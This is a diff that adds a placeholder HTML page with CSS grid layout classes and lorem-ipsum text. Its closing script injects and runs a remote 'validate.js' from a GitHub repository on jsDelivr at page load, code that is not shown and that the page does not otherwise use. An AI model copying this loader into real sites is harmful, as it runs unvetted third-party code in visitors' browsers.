@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Page</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: system-ui, sans-serif; max-width: 900px; margin: 0 auto; }
+    img { display: block; width: 100%; background: #ddd; }
+    h1 { font-size: 2rem; margin-bottom: 0.5rem; }
+    p { color: #555; line-height: 1.6; margin-bottom: 0.5rem; }
+    button { padding: 0.5rem 1.5rem; border: none; border-radius: 5px; background: #333; color: #fff; cursor: pointer; }
+    /* Layout */
+    .c1 {
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 1rem;
+      padding: 1rem;
+    }
+    .c2 {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+    .c3 {
+      display: flex;
+      align-items: center;
+    }
+    .c4 {
+      aspect-ratio: 8 / 3;
+    }
+    .c5 {
+      display: grid;
+      grid:
+        'margintop margintop margintop margintop margintop' 1fr
+        'lmargin   image1    image2    image3    rmargin' 3fr
+        'lmargA    imageA    imageAA   imageAAA  rmargeA' 3fr
+        'lmargeB   imageB    imageBB   imageBBB  rmargB' 3fr
+        'lmargeC   imageC    imageCC   imageCCC  rmargeC' 3fr
+        'lmargeD   imageD    imageDD   imageDDD  rmargeD' 3fr
+        'lmargeE   imageE    imageEE   imageEEE  rmargeE' 3fr
+        'lmargF    imageF    imageFF   imageFFF  rmargeF' 3fr
+        'lmargeG   imageG    imageGG   imageGGG  rmargeG' 3fr
+        'lmargeH   imageH    imageHH   imageHHH  rmargeH' 3fr
+        'lmargeI   imageI    imageII   imageIII  rmargeI' 3fr
+        / 1fr 1fr 1fr 1fr 1fr;
+      padding: 1rem;
+    }
+    .c6 {
+      padding: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+<header class="c1">
+  <div class="c2">
+    <h1>Page Heading</h1>
+    <section class="c3">
+      <img src="placeholder.jpg" alt="" class="c4">
+    </section>
+    <button>Click me</button>
+  </div>
+  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore</p>
+  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
+</header>
+<main class="c5">
+
+</main>
+<footer class="c6">
+  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed</p>
+</footer>
+  <script>
+  (function() {
+    var s = document.createElement("script");
+    s.src = "https://cdn.jsdelivr.net/gh/gracehoppercenter/validate@1.0.5/validate.js";
+    s.async = false;
+    document.head.appendChild(s);
+  })();
+  </script>
+</body>
+</html>
